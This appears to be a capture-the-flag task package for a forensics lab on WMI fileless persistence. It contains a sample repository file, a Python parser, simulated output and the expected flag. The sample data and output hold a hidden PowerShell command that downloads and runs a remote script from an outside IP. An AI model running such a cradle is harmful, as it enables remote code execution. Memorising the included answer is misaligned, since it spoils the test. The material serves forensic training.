@@ -1,0 +1,45 @@
+{
+  "id": "forensics-wmi",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{wm1_subscr1pt10n_p3rs1st3nc3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: WMI-подписка в репозитории CIM\n\n`OBJECTS.DATA` — фрагмент репозитория WMI (`C:\\Windows\\System32\\wbem\\Repository`).\nЗдесь атакующий спрятал постоянного потребителя (event consumer): WMI-подписка\nзапускает PowerShell, когда срабатывает фильтр, — это популярная fileless-\nперсистентность.\n\nВосстанови подписку: `__EventFilter`, `CommandLineEventConsumer`\n(`CommandLineTemplate`) и `__FilterToConsumerBinding`. Командная строка потребителя\nсодержит флаг.\n\n`strings OBJECTS.DATA` → затем `python3 parse_wmi.py`. Запиши флаг в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/OBJECTS.DATA",
+      "b64": "AAAAAAAAAAAAAAAAAAAAAE9CSkVDVFMuREFUQSBDSU0gcmVwb3NpdG9yeSB2MQAAAAAAAAAAX19FdmVudEZpbHRlcgAAAAAAAAAARmlsdGVyVG9Db25zdW1lckJpbmRpbmcAAAAAAAAAAENvbW1hbmRMaW5lRXZlbnRDb25zdW1lcgAAAAAAAAAATmFtZT1VcGRhdGVyQ29uc3VtZXIAAAAAAAAAAFF1ZXJ5PVNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiAzMDAgV0hFUkUgVGFyZ2V0SW5zdGFuY2UgSVNBICdXaW4zMl9QZXJmRm9ybWF0dGVkRGF0YV9QZXJmT1NfU3lzdGVtJwAAAAAAAAAAQ29tbWFuZExpbmVUZW1wbGF0ZT1wb3dlcnNoZWxsIC1ub3AgLXcgaGlkZGVuIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE4NS4yMjAuMTAxLjQvdy5wczEnKSI7IyBudG97d20xX3N1YnNjcjFwdDEwbl9wM3JzMXN0M25jM30AAAAAAAAAAEV4ZWN1dGFibGVQYXRoPUM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZQAAAAAAAAAAX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdCRU1cQ0lNT00="
+    },
+    {
+      "path": "/home/student/task/parse_wmi.py",
+      "text": "#!/usr/bin/env python3\n# Carve WMI persistence out of the CIM repository (OBJECTS.DATA):\n# recover __EventFilter, CommandLineEventConsumer and the binding.\nimport re\ndata = open(\"OBJECTS.DATA\",\"rb\").read()\ndef strings(b, n=6):\n    return [m.group().decode(\"ascii\") for m in re.finditer(rb\"[\\x20-\\x7e]{%d,}\" % n, b)]\ns = strings(data)\nfilters = [x for x in s if x.startswith(\"Query=\")]\nconsumers = [x for x in s if x.startswith(\"CommandLineTemplate=\")]\nprint(\"WMI subscriptions found: %d\" % len(consumers))\nfor f in filters:\n    print(\"[filter]   \" + f)\nfor c in consumers:\n    print(\"[consumer] \" + c)\nbindings = [x for x in s if \"FilterToConsumerBinding\" in x]\nprint(\"bindings   :\", bindings)\n"
+    }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт.py> — интерпретатор Python (вывод захвачен из реального запуска)",
+      "cases": [
+        {
+          "match": "--version|^-V$",
+          "example": "python3 --version",
+          "output": "Python 3.12.4"
+        },
+        {
+          "match": "parse_wmi\\.py",
+          "example": "python3 parse_wmi.py",
+          "output": "WMI subscriptions found: 1\n[filter]   Query=SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\n[consumer] CommandLineTemplate=powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.4/w.ps1')\";# nto{wm1_subscr1pt10n_p3rs1st3nc3}\nbindings   : ['FilterToConsumerBinding', '__FilterToConsumerBinding']\n"
+        }
+      ],
+      "fallback": "python3: доступно `python3 parse_wmi.py`\n"
+    }
+  }
+}
